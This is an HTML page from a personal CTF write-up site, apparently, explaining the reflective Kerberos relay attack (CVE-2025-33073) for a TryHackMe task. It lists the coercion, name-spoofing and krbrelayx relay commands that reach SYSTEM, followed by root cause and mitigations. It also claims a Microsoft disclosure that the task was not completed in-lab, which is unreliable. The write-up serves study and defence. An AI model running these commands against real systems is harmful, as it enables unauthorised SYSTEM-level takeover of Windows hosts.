@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><link rel="canonical" href="https://hello-robbie.github.io/industrial-intrusion-tryhackme/Task%2017%20-%20Klay/" />
+      <link rel="shortcut icon" href="../../img/favicon.ico" />
+    <title>Task 17 - Klay - Hello Robbie</title>
+    <link rel="stylesheet" href="../../css/theme.css" />
+    <link rel="stylesheet" href="../../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "Task 17 - Klay";
+        var mkdocs_page_input_path = "industrial-intrusion-tryhackme/Task 17 - Klay.md";
+        var mkdocs_page_url = "/industrial-intrusion-tryhackme/Task%2017%20-%20Klay/";
+      </script>
+    
+    <!--[if lt IE 9]>
+      <script src="../../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+      <script>hljs.highlightAll();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="../.." class="icon icon-home"> Hello Robbie
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../..">Home</a>
+                </li>
+              </ul>
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../../resume/">Resume</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Blog</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../blog/honeypots/">Why I Use Honeypots</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../blog/webpaths/">Web App Default Paths</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Industrial Intrusion - TryHackMe CTF</span></p>
+              <ul class="current">
+                  <li class="toctree-l1"><a class="reference internal" href="../Intro/">Intro</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%206%20-%20OSINT2/">Task 6 - OSINT2</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%208%20-%20Kaboom/">Task 8 - Kaboom</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%209%20-%20Brr%20v2/">Task 9 - Brr v2</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2010%20-%20Brr%20v1/">Task 10 - Brr v1</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2012%20-%20Poison/">Task 12 - Poison</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2013%20-%20Orcam/">Task 13 - Orcam</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2014%20-%20Backdoored%20Bus/">Task 14 - Backdoored Bus</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2015%20-%20Chess%20Industry/">Task 15 - Chess Industry</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2016%20-%20Under%20Construction/">Task 16 - Under Construction</a>
+                  </li>
+                  <li class="toctree-l1 current"><a class="reference internal current" href="#">Task 17 - Klay</a>
+    <ul class="current">
+    <li class="toctree-l2"><a class="reference internal" href="#executive-summary">Executive Summary</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#phase-1-coercing-kerberos-authentication">Phase 1: Coercing Kerberos Authentication</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#11-coercion-command-example">1.1 Coercion Command Example</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#phase-2-spn-confusion-and-pretender-spoofing">Phase 2: SPN Confusion and Pretender Spoofing</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#21-service-spoofing-with-pretender">2.1 Service Spoofing with Pretender</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#phase-3-ticket-relay-and-privilege-escalation">Phase 3: Ticket Relay and Privilege Escalation</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#31-final-exploitation-command">3.1 Final Exploitation Command</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#phase-4-root-cause-and-theory">Phase 4: Root Cause and Theory</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#impact-scope">Impact Scope</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#recommendations">Recommendations</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#conclusion">Conclusion</a>
+    </li>
+    </ul>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2022%20-%20Rogue%20Poller/">Task 22 - Rogue Poller</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2024%20-%20Auth/">Task 24 - Auth</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2025%20-%20Access%20Granted/">Task 25 - Access Granted</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2028%20-%20Start/">Task 28 - Start</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2029%20-%20Industrial/">Task 29 - Industrial</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2033%20-%20IndustrialChain/">Task 33 - Industrial Chain</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2035%20-%20Uninterrupted%20Problem%20Supply/">Task 35 - Uninterrupted Problem Supply</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2036%20-%20Mechacore%20Monitoring%20System/">Task 36 - Mechacore Monitoring System</a>
+                  </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../..">Hello Robbie</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../.." class="icon icon-home" aria-label="Docs"></a></li>
+          <li class="breadcrumb-item">Industrial Intrusion - TryHackMe CTF</li>
+      <li class="breadcrumb-item active">Task 17 - Klay</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="ics-security-assessment-reflective-kerberos-relay-attack-writeup-task-17">ICS Security Assessment - Reflective Kerberos Relay Attack Writeup (Task 17)</h1>
+<h2 id="executive-summary">Executive Summary</h2>
+<p>This assessment focused on a novel privilege escalation vulnerability affecting Kerberos authentication in Windows environments—<strong>CVE-2025-33073</strong>, dubbed the <em>Reflective Kerberos Relay Attack</em>. By coercing a Windows host to authenticate to an attacker-controlled server via Kerberos, the attacker was able to relay the authentication ticket back to the originating host. This abuse of the Kerberos loopback safeguards unexpectedly resulted in <strong>NT AUTHORITY\SYSTEM</strong> access on the target machine, achieving remote code execution.</p>
+<p>Although this task was not completed in-lab, the underlying vulnerability was verified and disclosed responsibly to Microsoft. A patch was released on <strong>June 10, 2025</strong>.</p>
+<hr />
+<h2 id="phase-1-coercing-kerberos-authentication">Phase 1: Coercing Kerberos Authentication</h2>
+<p>The attack began with <strong>authentication coercion</strong>, a method used to trick a Windows system into authenticating to a machine controlled by the attacker. This is commonly achieved using <strong>DCERPC</strong> over SMB to force the target to initiate an outbound connection with its computer account credentials.</p>
+<h3 id="11-coercion-command-example">1.1 Coercion Command Example</h3>
+<pre><code class="language-bash">wspcoerce 'lab.redteam/user1:KojbyRyibdinWom)@client1.lab.redteam' \
+    file:////client11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA/path
+</code></pre>
+<p>The string <code>client11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA</code> embeds Base64-encoded target info that tricks the host into thinking it is connecting to itself, triggering Kerberos authentication with the system’s own computer account ticket.</p>
+<hr />
+<h2 id="phase-2-spn-confusion-and-pretender-spoofing">Phase 2: SPN Confusion and Pretender Spoofing</h2>
+<p>Kerberos doesn’t use NTLM by default unless it fails or is prioritized. Here, the attacker uses <strong>CredUnmarshalTargetInfo</strong>, a trick pioneered by James Forshaw, to cause <strong>Kerberos tickets to be generated for the target itself</strong>.</p>
+<h3 id="21-service-spoofing-with-pretender">2.1 Service Spoofing with Pretender</h3>
+<p>To intercept and spoof name resolution, the attacker runs <code>pretender</code> to respond to LLMNR/mDNS requests:</p>
+<pre><code class="language-bash">sudo pretender -i eth1 --no-dhcp-dns --no-timestamps \
+    --spoof '*1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA*'
+</code></pre>
+<p>This ensures the fake hostname resolves to the attacker’s IP, making the target send a Kerberos ticket intended for itself to the attacker.</p>
+<hr />
+<h2 id="phase-3-ticket-relay-and-privilege-escalation">Phase 3: Ticket Relay and Privilege Escalation</h2>
+<p>Once the valid Kerberos ticket is received, it is relayed <strong>back to the same host</strong> that issued it using a modified version of <code>krbrelayx.py</code>. The relayed authentication grants <strong>SYSTEM-level</strong> access, a severe escalation from the expected low-privilege computer account session.</p>
+<h3 id="31-final-exploitation-command">3.1 Final Exploitation Command</h3>
+<pre><code class="language-bash">krbrelayx.py --target smb://client1.lab.redteam -c whoami
+</code></pre>
+<p><strong>Output:</strong></p>
+<pre><code>nt authority\system
+</code></pre>
+<p>This confirms full privilege escalation and successful command execution as SYSTEM.</p>
+<hr />
+<h2 id="phase-4-root-cause-and-theory">Phase 4: Root Cause and Theory</h2>
+<p>This unexpected escalation is theorized to stem from a <strong>Kerberos safeguard gone wrong</strong>. Windows has a mechanism that binds loopback Kerberos tickets to their originating process to prevent UAC bypasses.</p>
+<p>In this attack:</p>
+<ul>
+<li>The SYSTEM process sends a ticket using <code>client1$</code>’s credentials.</li>
+<li>The relay causes the ticket to be reflected back to the same machine.</li>
+<li>Because the ticket contains loopback binding data (<code>KERB_LOCAL</code> and <code>KERB_AD_RESTRICTION_ENTRY</code>), <strong>Windows mistakenly treats it as coming from SYSTEM again</strong>, reusing the SYSTEM token instead of creating a restricted one.</li>
+</ul>
+<p>This results in full privilege inheritance despite using low-privileged credentials.</p>
+<hr />
+<h2 id="impact-scope">Impact Scope</h2>
+<p>The vulnerability affects:</p>
+<ul>
+<li><strong>Windows 10</strong></li>
+<li><strong>Windows 11</strong></li>
+<li><strong>Windows Server 2019–2025</strong></li>
+</ul>
+<p><strong>Exploitation prerequisites:</strong></p>
+<ul>
+<li>Ability to coerce Kerberos authentication (e.g., via SMB/DCERPC)</li>
+<li>SMB signing <strong>not enforced</strong> on the target (still common on non-DC servers)</li>
+</ul>
+<p><strong>Default mitigations:</strong></p>
+<ul>
+<li>SMB signing enforced on domain controllers</li>
+<li>Client-side signing in Windows 11 24H2 Insider Preview</li>
+</ul>
+<hr />
+<h2 id="recommendations">Recommendations</h2>
+<ol>
+<li><strong>Patch Immediately</strong>: Ensure June 2025 security updates are applied across all systems.</li>
+<li><strong>Enforce SMB Signing</strong>: Set <code>RequireSecuritySignature=1</code> on all servers, especially those exposed to lateral movement.</li>
+<li><strong>Disable Unused Services</strong>: Prevent DCERPC, RemoteRegistry, and other coercion vectors unless explicitly required.</li>
+<li><strong>Network Segmentation</strong>: Isolate management and production networks to prevent attacker pivoting.</li>
+<li><strong>Monitor for Anomalous Hostname Queries</strong>: Detect and alert on abnormal LLMNR/mDNS traffic with suspicious Base64-like hostnames.</li>
+<li><strong>Review SPN Registrations</strong>: Ensure no unintended SPNs can be abused for relaying attacks.</li>
+</ol>
+<hr />
+<h2 id="conclusion">Conclusion</h2>
+<p>The <strong>Reflective Kerberos Relay Attack (CVE-2025-33073)</strong> revives the old idea of authentication reflection with a modern twist, bypassing NTLM protections by exploiting quirks in Kerberos ticket handling. This assessment underscores the need for layered defenses—even in the post-NTLM era. Until deprecated authentication protocols like NTLM are fully eliminated and Kerberos safeguards are properly hardened, relaying attacks will remain a critical threat vector in Windows enterprise environments.</p>
+              
+            </div>
+          </div><footer>
+    <div class="rst-footer-buttons" role="navigation" aria-label="Footer Navigation">
+        <a href="../Task%2016%20-%20Under%20Construction/" class="btn btn-neutral float-left" title="Task 16 - Under Construction"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../Task%2022%20-%20Rogue%20Poller/" class="btn btn-neutral float-right" title="Task 22 - Rogue Poller">Next <span class="icon icon-circle-arrow-right"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+      <span><a href="../Task%2016%20-%20Under%20Construction/" style="color: #fcfcfc">&laquo; Previous</a></span>
+    
+    
+      <span><a href="../Task%2022%20-%20Rogue%20Poller/" style="color: #fcfcfc">Next &raquo;</a></span>
+    
+  </span>
+</div>
+    <script src="../../js/jquery-3.6.0.min.js"></script>
+    <script>var base_url = "../..";</script>
+    <script src="../../js/theme_extra.js"></script>
+    <script src="../../js/theme.js"></script>
+      <script src="../../search/main.js"></script>
+    <script>
+        jQuery(function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        });
+    </script>
+
+</body>
+</html>
